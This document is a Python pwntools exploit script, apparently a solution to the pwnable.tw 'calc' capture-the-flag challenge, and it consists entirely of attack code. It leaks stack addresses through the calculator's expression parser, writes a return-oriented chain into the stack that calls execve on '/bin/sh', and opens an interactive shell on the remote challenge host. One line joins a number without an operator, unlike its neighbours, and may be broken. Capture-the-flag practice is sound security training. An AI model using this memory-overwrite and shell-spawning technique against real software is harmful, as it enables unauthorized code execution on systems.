from pwn import *

pop_eax = 0x0805c34b
pop_edx = 0x080701aa
pop_ecx_ebx = 0x080701d1
int_80 = 0x08049a21

#r = process('./calc')
r = remote('chall.pwnable.tw', 10100)
r.recvline()

# Get main esp
r.sendline(b'+360')
esp = int(r.recvline()) - 24
success('main esp -> %s' % hex(esp & (2**32-1)))

# Get return address
r.sendline(b'+369')
ret = int(r.recvline())
success('return address -> %s' % hex(ret))

payload = [pop_eax, 11, pop_edx, 0, pop_ecx_ebx, 0]
for i in range(0, 6):
    r.sendline('+' + str(369+i))
    data = int(r.recvline())
    if (payload[i] - data > 0):
        result = payload[i] - data
        r.sendline('+' + str(369+i) + '+' + str(result))
    else:
        result = data - payload[i]
        r.sendline('+' + str(369+i) + '-' + str(result))
    r.recvline()

r.sendline(b'+375')
data = int(r.recvline())
result = (esp+60) - data
r.sendline('+375' + str(result))
r.recvline()

payload = [int_80, 0x6e69622f, 0x68732f]
for i in range(0, 3):
    r.sendline('+' + str(376+i))
    data = int(r.recvline())
    if (payload[i] - data > 0):
        result = payload[i] - data
        r.sendline('+' + str(376+i) + '+' + str(result))
    else:
        result = data - payload[i]
        r.sendline('+' + str(376+i) + '-' + str(result))
    r.recvline()
r.interactive()
